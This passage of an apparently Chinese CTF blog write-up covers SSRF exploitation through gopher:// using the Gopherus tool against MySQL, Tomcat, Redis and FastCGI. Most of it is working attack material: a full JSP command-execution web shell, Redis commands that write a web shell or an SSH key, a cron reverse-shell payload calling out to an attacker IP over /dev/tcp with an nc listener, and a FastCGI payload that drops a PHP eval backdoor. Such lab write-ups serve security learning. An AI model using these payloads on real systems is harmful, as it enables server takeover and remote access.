-<h2 id="SSRF之SQL注入"><a href="#SSRF之SQL注入" class="headerlink" title="SSRF之SQL注入"></a>SSRF之SQL注入</h2><p><img src="/images/ssrf/pasted-image-20260313124816.png" alt="Pasted image 20260313124816"><br>再将ip后两次url编码</p>
-<h2 id="SSRF之mysql"><a href="#SSRF之mysql" class="headerlink" title="SSRF之mysql"></a>SSRF之mysql</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql  #启动 Gopherus 工具</span><br><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select * from security.users #**执行的 SQL 语句**</span><br></pre></td></tr></table></figure>
-<p><img src="/images/ssrf/pasted-image-20260313131110.png" alt="Pasted image 20260313131110"><br>结果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1d%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%73%65%63%75%72%69%74%79%2e%75%73%65%72%73%01%00%00%00%01</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="SSRF之tomcat"><a href="#SSRF之tomcat" class="headerlink" title="SSRF之tomcat"></a>SSRF之tomcat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String command = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(command != null)</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        out.print(&quot;format: xxx.jsp?cmd=Command&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>将其附加至你的抓包页面下，同时再将整体进行双重url编码<br>接着构造gopher协议即可<br><img src="/images/ssrf/pasted-image-20260314131310.png" alt="Pasted image 20260314131310"></p>
-<p><img src="/images/ssrf/pasted-image-20260314131324.png" alt="Pasted image 20260314131324"></p>
-<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><h3 id="未授权webshell写入"><a href="#未授权webshell写入" class="headerlink" title="未授权webshell写入"></a>未授权webshell写入</h3><p>1.虚拟机kali中</p>
-<ul>
-<li>cd ~&#x2F;桌面&#x2F;Gopherus</li>
-<li>启动攻击模块：python2 gopherus.py –exploit redis</li>
-<li>第一行输入攻击类型：PHPShell：生成一个 PHP WebShell 文件</li>
-<li><pre><code>                             ReverseShell：生成一个直接反弹 Shell 的 payload
-</code></pre>
-</li>
-<li>第二行输入路径:这个路径决定了 Redis 写入的恶意文件最终存储在服务器的哪个位置，需根据目标服务器的 Web 目录结构或可利用路径填写，才能让后续的恶意文件被有效访问和执行</li>
-<li><pre><code>                          /var/www/html
-</code></pre>
-</li>
-<li>第三行输入 WebShell 内容:<code>&lt;?=</code>$_GET[1]<code>?&gt;</code>Gopherus 会自动将 <code>dbfilename</code>（Redis 持久化文件名）设置为 <code>output.txt，配置完毕后</code>Gopherus 工具会根据输入生成相应的 Gopher 协议有效载荷<img src="/images/ssrf/pasted-image-20251212174234.png" alt="Pasted image 20251212174234"><br>2.再次编码后附加到url，显示此页面为504，没有关系，执行这段payload的目标就是在服务器根目录上传木马output.txt<br><img src="/images/ssrf/pasted-image-20251212174301.png" alt="Pasted image 20251212174301"><br>3.列出目录<br><img src="/images/ssrf/pasted-image-20251212174631.png" alt="Pasted image 20251212174631"><br>4.获取flag<br><img src="/images/ssrf/pasted-image-20251212174805.png" alt="Pasted image 20251212174805"></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">*1</span><br><span class="line">$7</span><br><span class="line">COMMAND</span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">CONFIG</span><br><span class="line">$3</span><br><span class="line">SET</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$14</span><br><span class="line">/var/www/html/</span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">dbfilename</span><br><span class="line">$8</span><br><span class="line">info.php</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$7</span><br><span class="line">payload</span><br><span class="line">$19</span><br><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<p>每行都是以 <code>\r</code> 结尾的，但是 Redis 的协议是以 CRLF (<code>\r\n</code>) 结尾，所以转换的时候需要把 <code>\r</code> 转换为 <code>\r\n</code>，然后其他全部进行 两次 URL 编码</p>
-<h3 id="redis未授权ssh公钥写入"><a href="#redis未授权ssh公钥写入" class="headerlink" title="redis未授权ssh公钥写入"></a>redis未授权ssh公钥写入</h3><p>1.生成公钥</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/ssrf/pasted-image-20260316191329.png" alt="Pasted image 20260316191329"><br>2.构造，将密钥写入payload（记得前后各加两行换行以排除其他因素的干扰，同时长度记得加4）同时修改文件名和路径（要拥有root权限，不然写入不了）<br>最后记得修改长度<br><img src="/images/ssrf/pasted-image-20260316190803.png" alt="Pasted image 20260316190803"><br>3.通过ssrf提交后重新登陆靶机发现不在需要密码了<br><img src="/images/ssrf/pasted-image-20260316191858.png" alt="Pasted image 20260316191858"></p>
-<h3 id="定时任务反弹shell"><a href="#定时任务反弹shell" class="headerlink" title="定时任务反弹shell"></a>定时任务反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip add #查看kali ip地址，我的是172.28.121.48</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/ssrf/pasted-image-20260316193056.png" alt="Pasted image 20260316193056"><br>1.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit redis</span><br></pre></td></tr></table></figure>
-<p>启动攻击<br>2.选择Reverseshell<br><img src="/images/ssrf/pasted-image-20260316193427.png" alt="Pasted image 20260316193427"><br>3.填写ip<br><img src="/images/ssrf/pasted-image-20260316194412.png" alt="Pasted image 20260316194412"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2468%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/172.28.121.48/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>
-<p>接着监听端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>在靶场修改主机名发送即可<br><img src="/images/ssrf/pasted-image-20260316194940.png" alt="Pasted image 20260316194940"></p>
-<h2 id="FastCGL协议"><a href="#FastCGL协议" class="headerlink" title="FastCGL协议"></a>FastCGL协议</h2><p>1.在虚拟机kali中打开终端</p>
-<ul>
-<li>命令行下载：git clone <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></li>
-<li>cd ~&#x2F;桌面&#x2F;Gopherus</li>
-<li>启动攻击模块：python2 gopherus.py –exploit fastcgi </li>
-<li>第一行输入路径：启动 Gopherus 的 FastCGI 攻击模块后，工具会提示输入目标服务器上存在的 PHP 文件路径，输入之前获取的 PHP 文件路径，我们这里选中网站根目录下的index.php文件，路径如下为&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php，这里通常选择网址中存在的文件</li>
-<li>第二行输入要执行的命令：接下来工具提示输入要执行的命令，这是可以选择ls &#x2F;或cat &#x2F;flag等，工具会根据输入生成相应的 Gopher 协议有效载荷。我们这里选择使用在根目录上传木马文件ljn.php，如下 echo PD9waHAgQGV2YWwoJF9QT1NUWydtb295dWFuJ10pOz8+ | base64 -d &gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;ljn.php ————把编码后的一句话木马写到名为ljn.php的文件中</li>
-<li>得到gopher:%2F%2F127.0.0.1:9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH137%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2589%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgQGV2YWwoJF9QT1NUWydtb295dWFuJ10pOz8%252B%2520%257C%2520base64%2520-d%2520%253E%2520%2Fvar%2Fwww%2Fhtml%2Fljn.php%2527%2529%253Bdie%2528%2527—–Made-by-SpyD3r—–%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500<br>2.在浏览器中将其附加在url后面<br>3.列出目录<br><img src="/images/ssrf/pasted-image-20251212093511.png" alt="Pasted image 20251212093511"><br>4.获取flag<br><img src="/images/ssrf/pasted-image-20251212093613.png" alt="Pasted image 20251212093613"></li>
-</ul>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web??</a></li></ul>
     </div>
 
       
